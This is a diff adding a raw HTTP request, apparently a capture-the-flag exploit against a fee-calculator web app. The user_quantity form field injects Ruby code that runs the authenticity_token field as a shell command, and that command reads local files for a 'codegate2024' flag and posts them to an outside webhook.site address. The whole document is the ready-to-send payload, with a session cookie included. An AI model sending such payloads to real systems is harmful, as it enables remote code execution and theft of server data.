@@ -1,0 +1,36 @@
+POST /calculate_fee HTTP/1.1
+Host: 3.34.253.4:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: application/json
+Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Referer: http://3.34.253.4:3000/
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------2612613108723821662430680472
+Content-Length: 810
+Origin: http://3.34.253.4:3000
+Connection: keep-alive
+Cookie: _master_of_calculator_session=vpUgs26Om9kprDkUndcW5pI9%2BQUllGE6dhWxWaduWUDiLO3MztVAvAbT%2BS8Rgh2XSGVrZxqRaGUH%2B7nRpAuD0ICVNkVXq3g4QQ%2BNcHyzmOS%2B0LKEK1iDTRM4WUbx6F3GUtF2aOR%2BzrGqTknSgyIdPJDCpg7CEn8T8PbJ5GgMWk9KUf38a9AaGNvXKPXMFmgTRZGT1%2FL26jTnDUHxcTc8yWtKmrKFRqdyUsLx6%2Fnsq3k5aPYG9ZqXJ%2BMm5vdDrZkq6x3NZX3oXGfKeV5Vq%2FVwanyHuLNoypgtowXmqp337vckGumMUQ%3D%3D--zZzhWcwDlnO0icry--kHmm4xtthQPhSF1zRh8Whg%3D%3D
+Priority: u=1
+
+-----------------------------2612613108723821662430680472
+Content-Disposition: form-data; name="authenticity_token"
+
+cat * | grep codegate2024 | curl -X POST -d @- https://webhook.site/c74a94c9-65c7-4e5f-a83f-85b57036bf89
+-----------------------------2612613108723821662430680472
+Content-Disposition: form-data; name="user_leverage"
+
+44
+-----------------------------2612613108723821662430680472
+Content-Disposition: form-data; name="user_entry_price"
+
+0
+-----------------------------2612613108723821662430680472
+Content-Disposition: form-data; name="user_exit_price"
+
+1
+-----------------------------2612613108723821662430680472
+Content-Disposition: form-data; name="user_quantity"
+
+1;Open3.popen3 request.POST.values.first;pnl=1
+-----------------------------2612613108723821662430680472--
